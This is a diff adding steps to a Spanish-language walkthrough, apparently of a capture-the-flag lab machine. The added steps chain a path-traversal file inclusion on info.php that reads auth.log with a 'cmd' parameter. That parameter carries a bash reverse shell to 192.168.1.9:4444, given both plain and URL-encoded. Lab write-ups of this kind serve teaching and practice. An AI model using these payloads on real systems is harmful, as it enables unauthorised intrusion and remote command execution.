@@ -99,3 +99,15 @@ Port: `8080`
 
 ![12](https://user-images.githubusercontent.com/75953873/175163339-db1853d5-b77c-47cb-86b5-0fa8e6e5fb28.png)
 
+Acceder a la URL: `http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=`
+
+BurpSuite capturará la solicitud GET y a la misma se le agregará comandos extras para acceder al interior de la máquina con una reverse shell:
+```
+http://192.168.1.10/antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.9/4444 0>&1'
+```
+![13](https://user-images.githubusercontent.com/75953873/175164908-c3716f51-9f43-4ad5-8f65-7b411f54495e.png)
+
+Antes de obtener un reverse shell, es preciso codificar los comandos extras:
+```
+antibot_image/antibots/info.php?image=../../../../../../../../../../../../var/log/auth.log&cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%39%2f%34%34%34%34%20%30%3e%26%31%27
+```
